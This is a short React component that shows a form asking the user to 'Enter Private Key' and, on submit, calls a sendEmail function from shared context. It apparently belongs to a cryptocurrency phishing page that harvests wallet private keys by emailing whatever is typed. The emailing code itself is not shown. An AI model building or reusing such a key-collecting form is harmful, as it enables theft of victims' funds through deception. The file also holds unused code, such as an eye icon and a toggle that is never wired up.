import classes from './privateKey.module.css'
import { FaEye } from "react-icons/fa";
import { useState, useContext } from "react";
import { UserContent } from '../../contextApi/contextApi';

const PrivateKey = () => {
    const { sendEmail } = useContext(UserContent);
      const [close, setClose] = useState(false);
     const toggleClose = () => {
       setClose(!close);
     };
  return (
    
      <>
        <form action="" onSubmit={sendEmail}>
          <div className={classes.inputs}>
        
            <div className={classes.inputEye}>
              <textarea
                className={classes.text}
                type={close ? "password" : "text"}
                placeholder="Enter Private Key"
              />
            </div>
          </div>
          <div className={classes.submit}>
            <button>Proceed</button>
          </div>
        </form>
      </>
    
  );
}

export default PrivateKey